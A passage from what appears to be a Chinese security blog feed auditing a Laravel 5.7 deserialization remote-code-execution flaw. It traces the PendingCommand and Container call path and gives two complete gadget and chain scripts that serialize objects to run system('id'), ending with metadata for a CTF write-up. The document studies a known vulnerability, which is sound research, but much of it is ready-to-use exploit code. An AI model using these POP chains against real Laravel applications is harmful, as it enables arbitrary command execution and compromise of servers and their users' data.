class="keyword">$this</span>-&gt;make($concrete);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;getExtenders($abstract) <span class="keyword">as</span> $extender) &#123;</span><br><span class="line">        $object = $extender($object, <span class="keyword">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instances[$abstract] = $object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;fireResolvingCallbacks($abstract, $object);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;resolved[$abstract] = <span class="keyword">true</span>;</span><br><span class="line">    array_pop(<span class="keyword">$this</span>-&gt;with);</span><br><span class="line">    <span class="keyword">return</span> $object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Container.php:697, Illuminate\Foundation\Application-&gt;getConcrete()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// abstract = Illuminate\Contracts\Console\Kernel</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getConcrete</span><span class="params">($abstract)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! is_null($concrete = <span class="keyword">$this</span>-&gt;getContextualConcrete($abstract))) &#123;</span><br><span class="line">        <span class="keyword">return</span> $concrete;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;bindings[$abstract])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bindings[$abstract][<span class="string">'concrete'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $abstract;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>在<code>getConcrete（）</code>方法中出了问题，导致可以利用 php 的反射机制实例化任意类。在 <code>getConcrete()</code> 方法中，判断 <code>$this-&gt;bindings[$abstract])</code> 是否存在，若存在则返回 <code>$this-&gt;bindings[$abstract][&#39;concrete&#39;]</code> 。<code>bindings</code> 是 <code>Container.php</code> 中 <code>Container</code> 类的属性，因此我们只需要找到一个继承自  <code>Container</code> 的类，就可以通过反序列化控制 <code>$this-&gt;bindings</code> 属性。<code>Illuminate\Foundation\Application</code> 继承自 <code>Container</code> 类。<code>$abstract</code> 为<code>Illuminate\Contracts\Console\Kernel</code> ，只需通过反序列化定义 <code>Illuminate\Foundation\Application</code> 的 <code>$bindings</code> 属性存在键名为 <code>Illuminate\Contracts\Console\Kernel</code> 的二维数组就能进入该分支语句，返回我们要实例化的类名。在这里返回的是 <code>Illuminate\Foundation\Application</code> 类。</p></li><li><p>在实例化 <code>Application类</code> 的时候， 要满足 <code>isBuildable()</code> 才可以进行 <code>build</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isBuildable</span><span class="params">($concrete, $abstract)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $concrete === $abstract || $concrete <span class="keyword">instanceof</span> Closure;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>此时明显不满足条件，所以接着执行 <code>$object = $this-&gt;make($concrete);</code> ，在 <code>make()</code> 函数中成功将 <code>$abstract</code> 重新赋值为 <code>Illuminate\Foundation\Application</code>，从而成功绕过 <code>isBuildable()</code> 函数，进入 <code>$this-&gt;build</code> 方法，就能看到使用<code>ReflectionClass</code>反射机制，实例化我们传入的类。</p></li><li><p>在返回一个 <code>Illuminate\Foundation\Application</code> 对象之后，<code>exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code> 又调用了 <code>call()</code> 方法，由于 <code>Illuminate\Foundation\Application</code> 没有 <code>call()</code> 方法，所以会调用父类 <code>Illuminate\Container\Container</code> 的 <code>call()</code> 方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span><span class="params">($callback, array $parameters = [], $defaultMethod = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> BoundMethod::call(<span class="keyword">$this</span>, $callback, $parameters, $defaultMethod);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>跟进 <code>BoundMethod::call()</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span><span class="params">($container, $callback, array $parameters = [], $defaultMethod = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">static</span>::isCallableWithAtSign($callback) || $defaultMethod) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::callClass($container, $callback, $parameters, $defaultMethod);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">static</span>::callBoundMethod($container, $callback, <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($container, $callback, $parameters)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(</span><br><span class="line">            $callback, <span class="keyword">static</span>::getMethodDependencies($container, $callback, $parameters)</span><br><span class="line">        );</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在 <code>isCallableWithAtSign()</code> 处判断回调函数是否为字符串并且其中含有 <code>@</code> ，并且 <code>$defaultMethod</code> 默认为 null，很明显不满足条件，进入 <code>callBoundMethod()</code> ，该函数只是判断 <code>$callback</code> 是否为数组。后面的匿名函数直接调用 <code>call_user_func_array()</code> ，并且第一个参数我们可控，参数值为 <code>system</code> ，第二个参数由 <code>getMethodDependencies()</code> 方法返回。跟进 <code>getMethodDependencies()</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getMethodDependencies</span><span class="params">($container, $callback, array $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $dependencies = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">static</span>::getCallReflector($callback)-&gt;getParameters() <span class="keyword">as</span> $parameter) &#123;</span><br><span class="line">        <span class="keyword">static</span>::addDependencyForCallParameter($container, $parameter, $parameters, $dependencies);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array_merge($dependencies, $parameters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>getCallReflector()</code> 用于反射获取 <code>$callback</code> 的对象， 然后执行 <code>addDependencyForCallParameter()</code> 为 <code>$callback</code> 的对象添加一些参数，最后将我们传入的 <code>$parameters</code> 数组和 <code>$dependencies</code> 数组合并， <code>$dependencies</code> 数组为空。最后相当于执行了 <code>call_user_func_array(&#39;system&#39;,array(&#39;id&#39;))</code></p></li><li><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// gadgets.php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">PendingCommand</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">command</span>;</span><br><span class="line"><span class="keyword">protected</span> $parameters;</span><br><span class="line"><span class="keyword">protected</span> $app;</span><br><span class="line"><span class="keyword">public</span> $test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters,$class,$app)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test=$class;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app=$app;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">GenericUser</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">attributes</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $attributes)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;attributes = $attributes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">hasBeenBootstrapped</span> = <span class="title">false</span>;</span><br><span class="line"><span class="keyword">protected</span> $bindings;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($bind)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;bindings=$bind;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// chain.php</span></span><br><span class="line">$genericuser = <span class="keyword">new</span> Illuminate\Auth\GenericUser(</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"expectedOutput"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>),</span><br><span class="line">        <span class="string">"expectedQuestions"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>)</span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line">$application = <span class="keyword">new</span> Illuminate\Foundation\Application(</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"Illuminate\Contracts\Console\Kernel"</span>=&gt;</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">"concrete"</span>=&gt;<span class="string">"Illuminate\Foundation\Application"</span></span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line">$exp = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">    <span class="string">"system"</span>,<span class="keyword">array</span>(<span class="string">'id'</span>),</span><br><span class="line">    $genericuser,</span><br><span class="line">    $application</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($exp));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>调用栈分析 : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Foundation\Testing\PendingCommand-&gt;__destruct()</span><br><span class="line">$test = Illuminate\Auth\GenericUser</span><br><span class="line">attributes = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">"expectedOutput"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>),</span><br><span class="line"><span class="string">"expectedQuestions"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>)</span><br><span class="line">)</span><br><span class="line">$app = Illuminate\Foundation\Application</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">"Illuminate\Contracts\Console\Kernel"</span> =&gt; </span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">"concrete"</span>=&gt;<span class="string">"Illuminate\Foundation\Application"</span>)</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">$command = <span class="string">"system"</span></span><br><span class="line">$parameters = <span class="keyword">array</span>(<span class="string">"id"</span>)</span><br><span class="line"></span><br><span class="line">Illuminate\Foundation\Testing\PendingCommand-&gt;run()</span><br><span class="line">Illuminate\Foundation\Testing\PendingCommand-&gt;mockConsoleOutput()</span><br><span class="line">Illuminate\Foundation\Testing\PendingCommand-&gt;createABufferedOutputMock()</span><br><span class="line"><span class="comment">// 在 foreach 中访问 expectedOutput 属性，但是 GenericUser 类没有这个属性，故而调用 __get() 方法</span></span><br><span class="line">Illuminate\Auth\GenericUser-&gt;__get()</span><br><span class="line"><span class="comment">// return attributes["expectedOutput"]</span></span><br><span class="line"><span class="comment">// return array("0"=&gt;"1")</span></span><br><span class="line"><span class="comment">// 在 foreach 中访问 expectedQuestions 属性，但是 GenericUser 类没有这个属性，故而调用 __get() 方法</span></span><br><span class="line">Illuminate\Auth\GenericUser-&gt;__get()</span><br><span class="line"><span class="comment">// return attributes["expectedQuestions"]</span></span><br><span class="line"><span class="comment">// return array("0"=&gt;"1")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Application 继承了 Container 所以这相当于执行父类的 offsetGet()</span></span><br><span class="line">Illuminate\Foundation\Application-&gt;offsetGet()</span><br><span class="line"><span class="comment">// key : Illuminate\Contracts\Console\Kernel</span></span><br><span class="line">Illuminate\Foundation\Application-&gt;make()</span><br><span class="line"><span class="comment">// abstract : Illuminate\Contracts\Console\Kernel</span></span><br><span class="line">Illuminate\Foundation\Application-&gt;make()</span><br><span class="line"><span class="comment">// abstract : Illuminate\Contracts\Console\Kernel</span></span><br><span class="line">Illuminate\Foundation\Application-&gt;resolve()</span><br><span class="line"><span class="comment">// abstract : Illuminate\Contracts\Console\Kernel</span></span><br><span class="line">Illuminate\Foundation\Application-&gt;getConcrete()</span><br><span class="line"><span class="comment">// $this-&gt;bindings[$abstract]['concrete'] : Illuminate\Foundation\Application</span></span><br><span class="line"></span><br><span class="line">Illuminate\Foundation\Application-&gt;call()</span><br><span class="line">Illuminate\Container\BoundMethod-&gt;call()</span><br><span class="line">Illuminate\Container\BoundMethod-&gt;getMethodDependencies()</span><br></pre></td></tr></table></figure></li></ul><h1 id="第二种漏洞分析"><a href="#第二种漏洞分析" class="headerlink" title="第二种漏洞分析"></a>第二种漏洞分析</h1><ul><li><p>同样的，在 <code>PendingCommand</code> 类的 <code>mockConsoleOutput()</code> 函数处，去触发 <code>__get()</code> 方法构造 pop 链，这里选择 <code>Faker\DefaultGenerator</code> 类，其 <code>__get()</code> 方法如下 : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>同样的方法绕过 <code>mockConsoleOutput()</code> 函数，运行到 <code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code> 处。只不过这次的关注点在于 <code>resolve()</code> 函数的 <code>$this-&gt;instances[$abstract]</code> 处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// abstract = Illuminate\Contracts\Console\Kernel</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">resolve</span><span class="params">($abstract, $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $abstract = <span class="keyword">$this</span>-&gt;getAlias($abstract);</span><br><span class="line">    $needsContextualBuild = ! <span class="keyword">empty</span>($parameters) || ! is_null(<span class="keyword">$this</span>-&gt;getContextualConcrete($abstract));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123;</span><br><span class="line">        <span class="comment">// 在这里返回一个可控的实例化对象</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;instances[$abstract];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;with[] = $parameters;</span><br><span class="line">    $concrete = <span class="keyword">$this</span>-&gt;getConcrete($abstract);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isBuildable($concrete, $abstract)) &#123;</span><br><span class="line">        $object = <span class="keyword">$this</span>-&gt;build($concrete);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $object = <span class="keyword">$this</span>-&gt;make($concrete);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;getExtenders($abstract) <span class="keyword">as</span> $extender) &#123;</span><br><span class="line">        $object = $extender($object, <span class="keyword">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instances[$abstract] = $object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;fireResolvingCallbacks($abstract, $object);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;resolved[$abstract] = <span class="keyword">true</span>;</span><br><span class="line">    array_pop(<span class="keyword">$this</span>-&gt;with);</span><br><span class="line">    <span class="keyword">return</span> $object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>instances</code> 是 <code>Container.php</code> 中 <code>Container</code> 类的属性。因此我们只需要找到一个继承自  <code>Container</code> 的类，就可以通过反序列化控制 <code>$this-&gt;instances</code> 属性。<code>Illuminate\Foundation\Application</code> 继承自 <code>Container</code> 类。<code>$abstract</code> 为<code>Illuminate\Contracts\Console\Kernel</code> ，只需通过反序列化定义 <code>Illuminate\Foundation\Application</code> 的 <code>$instances</code> 属性存在键名为 <code>Illuminate\Contracts\Console\Kernel</code> 的数组就能返回我们要实例化的类名。在这里返回的是 <code>Illuminate\Foundation\Application</code> 类。</p></li><li><p>其余的就和第一种相同了，不同点在于构造可控实例化对象的方法不同</p></li><li><p>exp : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// gadgets.php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">command</span>;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">public</span> $test;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters,$class,$app)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test=$class;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app=$app;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">instances</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($instance)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instances[<span class="string">"Illuminate\Contracts\Console\Kernel"</span>] = $instance;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// chain.php</span></span><br><span class="line">$defaultgenerator = <span class="keyword">new</span> Faker\DefaultGenerator(<span class="keyword">array</span>(<span class="string">"expectedOutput"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>),<span class="string">"expectedQuestions"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>)));</span><br><span class="line">$app = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">$application = <span class="keyword">new</span> Illuminate\Foundation\Application($app);</span><br><span class="line">$pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(<span class="string">'system'</span>, <span class="keyword">array</span>(<span class="string">'id'</span>), $defaultgenerator, $application);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><ul><li>代码调试的技巧</li><li>函数调用栈的分析</li><li>可控点的寻找</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://xz.aliyun.com/t/5483" target="_blank" rel="noopener">https://xz.aliyun.com/t/5483</a></li><li><a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" target="_blank" rel="noopener">https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/</a></li><li><a href="https://www.jianshu.com/p/438a95046403" target="_blank" rel="noopener">https://www.jianshu.com/p/438a95046403</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Laravel 代码审计&lt;/p&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="Laravel" scheme="http://yoursite.com/tags/Laravel/"/>
    
      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF web ssrf_me 的三种方法</title>
    <link href="http://yoursite.com/2019/08/10/De1CTF%20web%20ssrf_me%20%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2019/08/10/De1CTF web ssrf_me 的三种方法/</id>
    <published>2019-08-10T09:33:59.745Z</published>
    <updated>2019-08-27T15:36:05.369Z</updated>
    
